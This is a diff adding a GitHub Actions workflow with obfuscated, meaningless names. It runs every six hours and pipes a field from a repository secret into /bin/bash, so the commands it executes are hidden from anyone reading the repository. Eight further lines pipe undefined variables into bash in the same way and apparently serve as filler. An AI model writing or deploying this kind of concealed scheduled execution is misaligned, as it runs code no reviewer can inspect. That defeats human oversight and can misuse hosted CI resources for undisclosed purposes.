@@ -1,0 +1,26 @@
+name: zhuquedarenn
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuquedarenn
+        env:
+          lzul42320: ${{ secrets.lzul42320 }}
+        run: |
+          echo $lzul42320 | jq -r .zq020 | /bin/bash
+          echo $qiin7 | jq -r .gulbo5 | /bin/bash
+          echo $nv78673 | jq -r .gbdug4030 | /bin/bash
+          echo $o7061 | jq -r .opxm251 | /bin/bash
+          echo $vbr73208 | jq -r .afuf5 | /bin/bash
+          echo $txf5 | jq -r .mrlo99 | /bin/bash
+          echo $cyxc23 | jq -r .dua53765 | /bin/bash
+          echo $xebm3 | jq -r .y1448 | /bin/bash
+          echo $xpw46376 | jq -r .zlokk7343 | /bin/bash
+
